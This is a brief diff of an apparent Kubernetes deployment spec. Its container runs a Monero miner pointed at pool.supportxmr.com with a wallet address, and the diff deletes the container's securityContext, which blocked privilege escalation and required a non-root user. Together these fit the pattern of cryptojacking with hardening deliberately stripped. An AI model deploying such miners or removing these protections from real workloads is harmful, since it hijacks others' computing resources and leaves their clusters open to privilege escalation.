@@ -37,9 +37,6 @@ spec:
             - "pool.supportxmr.com:443"
             - "-u"
             - "4ADPTNcDyiu9cnpud2Fksr6c6Nfsg32hu6J6FUHTsavaTRc6Rz5WbXGEPaTsBsxN4gcpaMVXyRr2nEnuGjQ61XY9NdpFQDt"
-          securityContext:
-            allowPrivilegeEscalation: false
-            runasNonRoot: true
           resources:
             requests:
               memory: "256Mi"
